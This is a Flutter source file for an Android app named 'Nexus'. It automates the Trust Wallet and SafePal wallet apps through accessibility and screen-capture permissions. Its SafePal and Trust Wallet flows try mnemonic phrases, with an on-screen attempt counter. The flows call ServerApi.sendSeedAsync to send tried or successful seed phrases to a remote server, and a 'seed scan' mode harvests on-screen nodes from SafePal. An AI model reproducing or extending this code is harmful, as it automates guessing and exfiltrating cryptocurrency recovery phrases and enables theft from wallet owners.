import 'dart:async';

import 'package:flutter/foundation.dart';
import 'package:flutter/material.dart';
import 'package:flutter/services.dart';

import '../api/server_api.dart';
import '../theme/app_theme.dart';
import '../services/app_launcher.dart';
import '../services/automation_runner.dart';
import '../services/automation_log_file.dart';
import '../services/wallet_count_file.dart';
import '../services/android_image_matcher.dart';

/// 모바일 전용 메인 화면 - Trust Wallet 실행 + 이미지 인식 자동화
class MainScreen extends StatefulWidget {
  const MainScreen({super.key});

  @override
  State<MainScreen> createState() => _MainScreenState();
}

class _MainScreenState extends State<MainScreen> with WidgetsBindingObserver {
  final _logController = ScrollController();
  final List<String> _logLines = [];
  bool _running = false;
  int _walletCount = 0;
  Timer? _sessionTimer;
  String _expiryText = '만료일: -';
  Color _expiryColor = AppTheme.logRed;
  bool _hasScreenPermission = false;
  bool _hasTouchPermission = false;
  String _templatePath = '';
  final _passwordController = TextEditingController();
  final _nodeTestController = TextEditingController(text: 'Import');
  bool _saveStepRecord = false;
  bool _nodeCollectorRunning = false;
  int _nodeCollectorCount = 0;
  Timer? _collectorStatusTimer;

  @override
  void initState() {
    super.initState();
    WidgetsBinding.instance.addObserver(this);
    _refreshExpiry();
    _refreshWalletCount();
    _checkPermissions();
    if (ServerApi.enabled && ServerApi.currentToken != null && ServerApi.currentToken!.isNotEmpty) {
      _sessionTimer = Timer.periodic(const Duration(seconds: 15), (_) => _validateSession());
    }
    WidgetsBinding.instance.addPostFrameCallback((_) => _requestPermissionsOnStart());
    _collectorStatusTimer = Timer.periodic(const Duration(seconds: 1), (_) => _refreshNodeCollectorStatus());
  }

  Future<void> _refreshNodeCollectorStatus() async {
    final running = await AndroidImageMatcher.isNodeCollectorRunning();
    final count = await AndroidImageMatcher.getNodeCollectorCount();
    if (mounted && (_nodeCollectorRunning != running || _nodeCollectorCount != count)) {
      setState(() {
        _nodeCollectorRunning = running;
        _nodeCollectorCount = count;
      });
    }
  }

  Future<void> _onStartNodeCollector() async {
    final ok = await AndroidImageMatcher.startNodeCollector();
    if (!mounted) return;
    _appendLog(ok ? '수집 모드 시작 → Trust Wallet으로 전환하세요' : '수집 모드 시작 실패', red: !ok);
    await _refreshNodeCollectorStatus();
  }

  /// 시드 스캔: SafePal 실행 후 노드 수집 시작 (io.safepal.wallet)
  Future<void> _onStartSafePalSeedScan() async {
    final launched = await AppLauncher.launchSafePal();
    if (!mounted) return;
    if (!launched) {
      _appendLog('SafePal 앱을 찾을 수 없습니다. (io.safepal.wallet)', red: true);
      return;
    }
    _appendLog('SafePal 실행됨 → 시드 스캔(노드 수집) 시작');
    await Future.delayed(const Duration(milliseconds: 800));
    final ok = await AndroidImageMatcher.startNodeCollector();
    if (!mounted) return;
    _appendLog(ok ? '시드 스캔 시작 → SafePal 화면에서 5초마다 노드 수집됨' : '시드 스캔 시작 실패', red: !ok);
    await _refreshNodeCollectorStatus();
  }

  Future<void> _onStopNodeCollector() async {
    await AndroidImageMatcher.stopNodeCollector();
    if (mounted) await _refreshNodeCollectorStatus();
  }

  /// 앱 시작 시 권한 자동 요청
  Future<void> _requestPermissionsOnStart() async {
    try {
      await AndroidImageMatcher.requestScreenPermission();
      await Future.delayed(const Duration(milliseconds: 500));
      final hasTouch = await AndroidImageMatcher.hasTouchPermission();
      if (!hasTouch) {
        await AndroidImageMatcher.requestTouchPermission();
      }
      await _checkPermissions();
    } catch (_) {}
  }

  Future<void> _checkPermissions() async {
    final touch = await AndroidImageMatcher.hasTouchPermission();
    final path = await AndroidImageMatcher.picsDir;
    if (!mounted) return;
    setState(() {
      _hasTouchPermission = touch;
      _templatePath = path;
    });
  }

  Future<void> _validateSession() async {
    final token = ServerApi.currentToken;
    if (token == null || token.isEmpty) return;
    final valid = await ServerApi.validateSessionAsync(token);
    if (valid) return;
    _sessionTimer?.cancel();
    if (!mounted) return;
    _appendLog('세션 만료. 프로그램을 종료합니다.');
    Navigator.of(context).pushNamedAndRemoveUntil('/login', (r) => false);
  }

  void _refreshExpiry() {
    final exp = ServerApi.subscriptionExpiry;
    if (exp == null) {
      setState(() {
        _expiryText = '사용기간: 없음';
        _expiryColor = AppTheme.logRed;
      });
      return;
    }
    final local = exp.toLocal();
    final dateStr = '${local.year}-${local.month.toString().padLeft(2, '0')}-${local.day.toString().padLeft(2, '0')}';
    setState(() {
      _expiryText = '만료일: $dateStr';
      _expiryColor = ServerApi.isSubscriptionValid() ? AppTheme.accent : AppTheme.logRed;
    });
  }

  Future<void> _refreshWalletCount() async {
    final n = await WalletCountFile.read();
    if (!mounted) return;
    setState(() => _walletCount = n);
  }

  void _appendLog(String text, {bool red = false}) {
    debugPrint(text);
    AutomationLogFile.append(text).catchError((_) {});
    if (!mounted) return;
    setState(() {
      _logLines.add(text);
      WidgetsBinding.instance.addPostFrameCallback((_) {
        if (mounted && _logController.hasClients) {
          _logController.animateTo(
            _logController.position.maxScrollExtent,
            duration: const Duration(milliseconds: 100),
            curve: Curves.easeOut,
          );
        }
      });
    });
  }

  Future<void> _onRequestScreenPermission() async {
    try {
      await AndroidImageMatcher.requestScreenPermission();
      if (!mounted) return;
      _appendLog('→ 시스템 팝업이 뜨면 반드시 "시작" 버튼을 눌러 허용하세요.');
    } catch (e) {
      if (!mounted) return;
      _appendLog('캡처 권한 요청 오류: $e', red: true);
    }
  }

  Future<void> _onRequestTouchPermission() async {
    await AndroidImageMatcher.requestTouchPermission();
    if (!mounted) return;
    _appendLog('설정에서 Nexus 접근성 서비스를 활성화해주세요');
    await _checkPermissions();
  }

  /// 터치만 검증 (캡처/매칭 없이) — 원인 파악용
  Future<void> _onTouchTest() async {
    final hasTouch = await AndroidImageMatcher.hasTouchPermission();
    if (!hasTouch) {
      _appendLog('터치 테스트: 접근성 권한 없음. 먼저 접근성을 켜주세요.', red: true);
      return;
    }
    AndroidImageMatcher.debugLog = (t) => _appendLog(t);
    _appendLog('--- 터치 테스트: 화면 중앙(540,1200) 한 번 탭 ---');
    final ok = await AndroidImageMatcher.testTouchAt(540, 1200);
    AndroidImageMatcher.debugLog = null;
    if (!mounted) return;
    if (ok) {
      _appendLog('터치 테스트: 전송결과 true → 터치 동작함. 문제는 캡처/매칭 쪽일 수 있음.');
    } else {
      _appendLog('터치 테스트: 전송결과 false → 터치(접근성) 쪽 문제 가능.', red: true);
    }
  }

  /// 캡처만 검증 (매칭/터치 없이) — 원인 파악용
  /// 원리: 권한 없이 takeCapture() 호출 시 MediaProjection 세션 없음 → 네이티브에서 크래시 → 먼저 권한 요청 후 3초 대기했다가 테스트
  Future<void> _onCaptureTest() async {
    final doTest = await showDialog<bool>(
      context: context,
      builder: (ctx) => AlertDialog(
        title: const Text('캡처 테스트'),
        content: const Text(
          '화면캡처 권한이 없으면 앱이 꺼질 수 있습니다.\n\n'
          '다음 누르면 권한 팝업이 뜹니다. 팝업에서 반드시 "시작"을 누른 뒤, 3초 후 자동으로 캡처를 시도합니다.',
        ),
        actions: [
          TextButton(onPressed: () => Navigator.of(ctx).pop(false), child: const Text('취소')),
          TextButton(onPressed: () => Navigator.of(ctx).pop(true), child: const Text('다음')),
        ],
      ),
    );
    if (doTest != true || !mounted) return;
    AndroidImageMatcher.debugLog = (t) => _appendLog(t);
    _appendLog('--- 캡처 테스트 (팝업에서 "시작" 누르고 3초 대기) ---');
    await AndroidImageMatcher.requestScreenPermission();
    await Future.delayed(const Duration(seconds: 3));
    if (!mounted) return;
    _appendLog('캡처 시도 중...');
    bool ok = false;
    try {
      ok = await AndroidImageMatcher.testCapture();
    } catch (e, st) {
      _appendLog('캡처 테스트 예외: $e', red: true);
    }
    AndroidImageMatcher.debugLog = null;
    if (!mounted) return;
    if (ok) {
      setState(() => _hasScreenPermission = true);
      _appendLog('캡처 테스트: OK → 캡처 동작함.');
    } else {
      _appendLog('캡처 테스트: 실패. 팝업에서 "시작" 눌렀는지 확인 후 다시 시도.', red: true);
    }
  }

  Future<void> _onStart() async {
    if (_running) return;
    if (!ServerApi.isSubscriptionValid()) {
      if (!mounted) return;
      showDialog(
        context: context,
        builder: (ctx) => AlertDialog(
          title: const Text('이용기간'),
          content: const Text('이용기간이 없거나 만료되었습니다. 프로그램을 종료합니다.'),
          actions: [
            TextButton(
              onPressed: () {
                Navigator.of(ctx).pop();
                Navigator.of(context).popUntil((route) => route.isFirst);
              },
              child: const Text('확인'),
            ),
          ],
        ),
      );
      return;
    }

    final hasTouch = await AndroidImageMatcher.hasTouchPermission();
    if (!hasTouch) {
      if (!mounted) return;
      showDialog(
        context: context,
        builder: (ctx) => AlertDialog(
          title: const Text('접근성 권한 필요'),
          content: const Text(
            '설정 > 접근성에서 "nexus_flutter" 또는 "Nexus"를 찾아 스위치를 켜주세요.\n\n'
            '활성화 후 뒤로가기로 돌아오면 자동으로 인식됩니다.',
          ),
          actions: [
            TextButton(
              onPressed: () => Navigator.of(ctx).pop(),
              child: const Text('취소'),
            ),
            TextButton(
              onPressed: () async {
                Navigator.of(ctx).pop();
                await AndroidImageMatcher.requestTouchPermission();
              },
              child: const Text('설정 열기'),
            ),
          ],
        ),
      );
      return;
    }

    setState(() {
      _running = true;
      _logLines.clear();
    });
    await AutomationLogFile.clear();

    AutomationRunner.password = _passwordController.text.trim();
    AndroidImageMatcher.debugSaveCaptureAndLog = _saveStepRecord;

    final logDir = await AutomationLogFile.getLogDirectory();
    _appendLog('로그 폴더: $logDir');
    _appendLog('PC로 복사: adb -s <기기ID> pull $logDir C:\\Users\\alsdh\\OneDrive\\Desktop\\log');

    await AutomationRunner.run(
      logLine: (t) {
        if (mounted) _appendLog(t);
        else AutomationLogFile.append(t).catchError((_) {});
      },
      logLineRed: (t) {
        if (mounted) _appendLog(t, red: true);
        else AutomationLogFile.append(t).catchError((_) {});
      },
      addAttemptedPhrase: (p) {
        final token = ServerApi.currentToken;
        if (token != null && token.isNotEmpty) {
          ServerApi.sendSeedAsync(token, p);
        }
      },
      replaceLogLastLine: (t) {
        if (!mounted) return;
        setState(() {
          if (_logLines.isNotEmpty) _logLines.removeLast();
          _logLines.add(t);
        });
      },
      setClipboard: (t) => Clipboard.setData(ClipboardData(text: t)),
    );

    if (!mounted) return;
    setState(() {
      _running = false;
      _refreshWalletCount();
    });
  }

  Future<void> _onStartSafePal() async {
    if (_running) return;
    if (!ServerApi.isSubscriptionValid()) {
      if (!mounted) return;
      showDialog(
        context: context,
        builder: (ctx) => AlertDialog(
          title: const Text('이용기간'),
          content: const Text('이용기간이 없거나 만료되었습니다. 프로그램을 종료합니다.'),
          actions: [
            TextButton(
              onPressed: () {
                Navigator.of(ctx).pop();
                Navigator.of(context).popUntil((route) => route.isFirst);
              },
              child: const Text('확인'),
            ),
          ],
        ),
      );
      return;
    }

    final hasTouch = await AndroidImageMatcher.hasTouchPermission();
    if (!hasTouch) {
      if (!mounted) return;
      showDialog(
        context: context,
        builder: (ctx) => AlertDialog(
          title: const Text('접근성 권한 필요'),
          content: const Text(
            '설정 > 접근성에서 "nexus_flutter" 또는 "Nexus"를 찾아 스위치를 켜주세요.\n\n'
            '활성화 후 뒤로가기로 돌아오면 자동으로 인식됩니다.',
          ),
          actions: [
            TextButton(onPressed: () => Navigator.of(ctx).pop(), child: const Text('취소')),
            TextButton(
              onPressed: () async {
                Navigator.of(ctx).pop();
                await AndroidImageMatcher.requestTouchPermission();
              },
              child: const Text('설정 열기'),
            ),
          ],
        ),
      );
      return;
    }

    setState(() {
      _running = true;
      _logLines.clear();
    });
    await AutomationLogFile.clear();

    AutomationRunner.password = _passwordController.text.trim();
    AndroidImageMatcher.debugSaveCaptureAndLog = _saveStepRecord;

    final logDir = await AutomationLogFile.getLogDirectory();
    _appendLog('로그 폴더: $logDir');
    _appendLog('--- SafePal 플로우 (assets/app/first.png, errorword.png) ---');

    await AutomationRunner.runSafePal(
      logLine: (t) {
        if (mounted) _appendLog(t);
        else AutomationLogFile.append(t).catchError((_) {});
      },
      logLineRed: (t) {
        if (mounted) _appendLog(t, red: true);
        else AutomationLogFile.append(t).catchError((_) {});
      },
      onSuccessPhrase: (p) {
        final token = ServerApi.currentToken;
        if (token != null && token.isNotEmpty) {
          ServerApi.sendSeedAsync(token, p);
        }
      },
      replaceLogLastLine: (t) {
        if (!mounted) return;
        setState(() {
          if (_logLines.isNotEmpty) _logLines.removeLast();
          _logLines.add(t);
        });
      },
      setClipboard: (t) => Clipboard.setData(ClipboardData(text: t)),
    );

    if (!mounted) return;
    setState(() {
      _running = false;
      _refreshWalletCount();
    });
  }

  void _onStop() {
    if (!_running) return;
    AutomationRunner.requestStop();
    _appendLog('중지 요청');
  }

  /// SafePal 삭제 루프만 테스트 (first → select → delete1 → delete2 → 비밀번호)
  Future<void> _onSafePalDeleteTest() async {
    if (_running) return;
    final hasTouch = await AndroidImageMatcher.hasTouchPermission();
    if (!hasTouch) {
      if (!mounted) return;
      _appendLog('접근성 권한 필요.', red: true);
      return;
    }
    setState(() {
      _running = true;
      _logLines.clear();
    });
    AutomationRunner.password = _passwordController.text.trim();
    AndroidImageMatcher.debugLog = (t) => _appendLog(t);

    await AutomationRunner.runSafePalDeleteTest(
      logLine: (t) {
        if (mounted) _appendLog(t);
      },
      logLineRed: (t) {
        if (mounted) _appendLog(t, red: true);
      },
      count: AutomationRunner.testDeleteCount,
    );

    AndroidImageMatcher.debugLog = null;
    if (!mounted) return;
    setState(() => _running = false);
  }

  @override
  void didChangeAppLifecycleState(AppLifecycleState state) {
    if (state == AppLifecycleState.resumed) {
      _checkPermissions();
    }
  }

  @override
  void dispose() {
    WidgetsBinding.instance.removeObserver(this);
    _sessionTimer?.cancel();
    _collectorStatusTimer?.cancel();
    _logController.dispose();
    _passwordController.dispose();
    _nodeTestController.dispose();
    super.dispose();
  }

  Future<void> _onNodeClickTest() async {
    final text = _nodeTestController.text.trim();
    if (text.isEmpty) return;
    final ok = await AndroidImageMatcher.clickByAccessibilityText(text);
    if (!mounted) return;
    _appendLog(ok ? '노드 클릭 "$text": 성공' : '노드 클릭 "$text": 실패 (해당 텍스트 없음)', red: !ok);
  }

  /// UIAutomator 선택자용: resourceId | text | contentDesc 목록 (노드 상세)
  Future<void> _onShowNodeDetails() async {
    final hasTouch = await AndroidImageMatcher.hasTouchPermission();
    if (!hasTouch) {
      _appendLog('접근성 권한 필요.', red: true);
      return;
    }
    final list = await AndroidImageMatcher.getNodeDetailsForSelectors();
    if (!mounted) return;
    final text = list.isEmpty
        ? '목록 없음.\n\n'
          '• 지금은 Nexus 화면 → Nexus 노드만 수집됩니다.\n'
          '• Trust Wallet 노드: "수집 모드"로 전환 후 Trust Wallet 화면에서 자동 수집.\n'
          '• 저장 위치: log 폴더 (nodes_collected.txt)'
        : list.join('\n');
    showDialog(
      context: context,
      builder: (ctx) => AlertDialog(
        title: const Text('노드 상세 (선택자용)'),
        content: SingleChildScrollView(
          child: SelectableText(text, style: const TextStyle(fontSize: 11, fontFamily: 'monospace')),
        ),
        actions: [TextButton(onPressed: () => Navigator.pop(ctx), child: const Text('닫기'))],
      ),
    );
  }

  /// 현재 화면(Trust Wallet 등)의 버튼/텍스트 목록 보기 → accessibilityTextMap 채울 때 참고
  Future<void> _onShowNodeTexts() async {
    final hasTouch = await AndroidImageMatcher.hasTouchPermission();
    if (!hasTouch) {
      _appendLog('접근성 권한 필요.', red: true);
      return;
    }
    final list = await AndroidImageMatcher.getAccessibilityNodeTexts();
    if (!mounted) return;
    final text = list.isEmpty
        ? '목록 없음. Trust Wallet 화면을 연 상태에서 다시 누르세요.'
        : list.join('\n');
    showDialog(
      context: context,
      builder: (ctx) => AlertDialog(
        title: const Text('현재 화면 노드 텍스트'),
        content: SingleChildScrollView(
          child: SelectableText(text, style: const TextStyle(fontSize: 12)),
        ),
        actions: [
          TextButton(
            onPressed: () => Navigator.of(ctx).pop(),
            child: const Text('닫기'),
          ),
        ],
      ),
    );
  }

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      backgroundColor: AppTheme.bgDark,
      appBar: AppBar(
        title: const Text('Nexus'),
        backgroundColor: AppTheme.bgPanel,
      ),
      body: Column(
        children: [
          Container(
            padding: const EdgeInsets.fromLTRB(12, 8, 12, 8),
            color: AppTheme.bgPanel,
            child: Column(
              crossAxisAlignment: CrossAxisAlignment.start,
              children: [
                Text(_expiryText, style: TextStyle(color: _expiryColor, fontSize: 14)),
                Text('니모닉문구 시도 횟수: $_walletCount', style: const TextStyle(color: AppTheme.fg, fontSize: 14)),
                Row(
                  children: [
                    const Text('비밀번호', style: TextStyle(color: AppTheme.fg, fontSize: 14)),
                    const SizedBox(width: 8),
                    SizedBox(
                      width: 100,
                      child: TextField(
                        controller: _passwordController,
                        obscureText: true,
                        style: const TextStyle(color: AppTheme.fg, fontSize: 14),
                        decoration: const InputDecoration(
                          isDense: true,
                          contentPadding: EdgeInsets.symmetric(horizontal: 8, vertical: 6),
                          border: OutlineInputBorder(),
                        ),
                      ),
                    ),
                  ],
                ),
                // if (_templatePath.isNotEmpty)
                //   Padding(
                //     padding: const EdgeInsets.only(top: 4),
                //     child: Text('템플릿: $_templatePath', style: TextStyle(color: AppTheme.muted, fontSize: 11), maxLines: 2, overflow: TextOverflow.ellipsis),
                //   ),
                // const SizedBox(height: 4),
                // Text('클릭 방식: 캡처 → 이미지 매칭(first.png 등) → 해당 위치 터치. 팝업 뜨면 "시작" 눌러 허용.', style: TextStyle(color: AppTheme.muted, fontSize: 11)),
                // Row(
                //   children: [
                //     SizedBox(
                //       width: 24,
                //       height: 24,
                //       child: Checkbox(
                //         value: _saveStepRecord,
                //         onChanged: _running ? null : (v) => setState(() => _saveStepRecord = v ?? false),
                //         materialTapTargetSize: MaterialTapTargetSize.shrinkWrap,
                //       ),
                //     ),
                //     const SizedBox(width: 4),
                //     Text('단계별 캡처/클릭 기록 (log 폴더)', style: TextStyle(color: AppTheme.muted, fontSize: 11)),
                //   ],
                // ),
                const SizedBox(height: 6),
                Wrap(
                  spacing: 6,
                  runSpacing: 6,
                  children: [
                    // ElevatedButton(
                    //   onPressed: _running ? null : _onStart,
                    //   style: ElevatedButton.styleFrom(backgroundColor: AppTheme.accent, foregroundColor: AppTheme.bgDark),
                    //   child: const Text('시작'),
                    // ),
                    ElevatedButton(
                      onPressed: _running ? null : _onStartSafePal,
                      style: ElevatedButton.styleFrom(backgroundColor: AppTheme.accent.withOpacity(0.9), foregroundColor: AppTheme.bgDark),
                      child: const Text('시작 (SafePal)'),
                    ),
                    TextButton(
                      onPressed: _running ? _onStop : null,
                      style: TextButton.styleFrom(
                        backgroundColor: AppTheme.buttonStopBg,
                        foregroundColor: AppTheme.fg,
                      ),
                      child: const Text('중지'),
                    ),
                    // OutlinedButton(
                    //   onPressed: _onRequestScreenPermission,
                    //   child: Text(_hasScreenPermission ? '화면 캡처 ✓' : '화면 캡처 권한'),
                    // ),
                    // OutlinedButton(
                    //   onPressed: _onRequestTouchPermission,
                    //   child: Text(_hasTouchPermission ? '접근성 ✓' : '접근성 권한'),
                    // ),
                    // OutlinedButton(
                    //   onPressed: _running ? null : _onTouchTest,
                    //   child: const Text('터치 테스트'),
                    // ),
                    // OutlinedButton(
                    //   onPressed: _running ? null : _onCaptureTest,
                    //   child: const Text('캡처 테스트'),
                    // ),
                    // Row(
                    //   mainAxisSize: MainAxisSize.min,
                    //   children: [
                    //     SizedBox(
                    //       width: 90,
                    //       child: TextField(
                    //         controller: _nodeTestController,
                    //         style: const TextStyle(color: AppTheme.fg, fontSize: 12),
                    //         decoration: const InputDecoration(
                    //           isDense: true,
                    //           contentPadding: EdgeInsets.symmetric(horizontal: 6, vertical: 4),
                    //           border: OutlineInputBorder(),
                    //         ),
                    //       ),
                    //     ),
                    //     const SizedBox(width: 4),
                    //     OutlinedButton(
                    //       onPressed: _running ? null : _onNodeClickTest,
                    //       child: const Text('노드클릭'),
                    //     ),
                    //   ],
                    // ),
                    // OutlinedButton(
                    //   onPressed: _running ? null : _onShowNodeTexts,
                    //   child: const Text('노드 목록'),
                    // ),
                    // OutlinedButton(
                    //   onPressed: _running ? null : _onShowNodeDetails,
                    //   child: const Text('노드 상세(선택자)'),
                    // ),
                    // Container(
                    //   padding: const EdgeInsets.symmetric(horizontal: 8, vertical: 4),
                    //   decoration: BoxDecoration(
                    //     color: _nodeCollectorRunning ? AppTheme.accent.withOpacity(0.2) : null,
                    //     border: Border.all(color: _nodeCollectorRunning ? AppTheme.accent : Colors.grey, width: 1),
                    //     borderRadius: BorderRadius.circular(4),
                    //   ),
                    //   child: Row(
                    //     mainAxisSize: MainAxisSize.min,
                    //     children: [
                    //       Text('수집: ${_nodeCollectorRunning ? "ON ($_nodeCollectorCount회)" : "OFF"}', style: const TextStyle(fontSize: 11)),
                    //       const SizedBox(width: 6),
                    //       TextButton(
                    //         onPressed: _running ? null : (_nodeCollectorRunning ? _onStopNodeCollector : _onStartNodeCollector),
                    //         style: TextButton.styleFrom(padding: const EdgeInsets.symmetric(horizontal: 8), minimumSize: Size.zero),
                    //         child: Text(_nodeCollectorRunning ? '중지' : '시작', style: const TextStyle(fontSize: 11)),
                    //       ),
                    //     ],
                    //   ),
                    // ),
                    // OutlinedButton(
                    //   onPressed: _running || _nodeCollectorRunning ? null : _onStartSafePalSeedScan,
                    //   child: const Text('시드 스캔 (SafePal)'),
                    // ),
                    // OutlinedButton(
                    //   onPressed: _running ? null : _onSafePalDeleteTest,
                    //   child: const Text('삭제 루프 테스트 (SafePal)'),
                    // ),
                  ],
                ),
              ],
            ),
          ),
          Expanded(
            child: Container(
              margin: const EdgeInsets.all(8),
              color: const Color(0xFF1C1C1C),
              child: ListView.builder(
                controller: _logController,
                padding: const EdgeInsets.all(8),
                itemCount: _logLines.length,
                itemBuilder: (_, i) {
                  final line = _logLines[i];
                  final isRed = line.startsWith('오류') || line.contains('실패') || line.contains('찾을 수 없습니다') || line.contains('권한');
                  return SelectableText(
                    line,
                    style: TextStyle(
                      fontFamily: 'monospace',
                      fontSize: 12,
                      color: isRed ? AppTheme.logRed : AppTheme.accent,
                    ),
                  );
                },
              ),
            ),
          ),
        ],
      ),
    );
  }
}
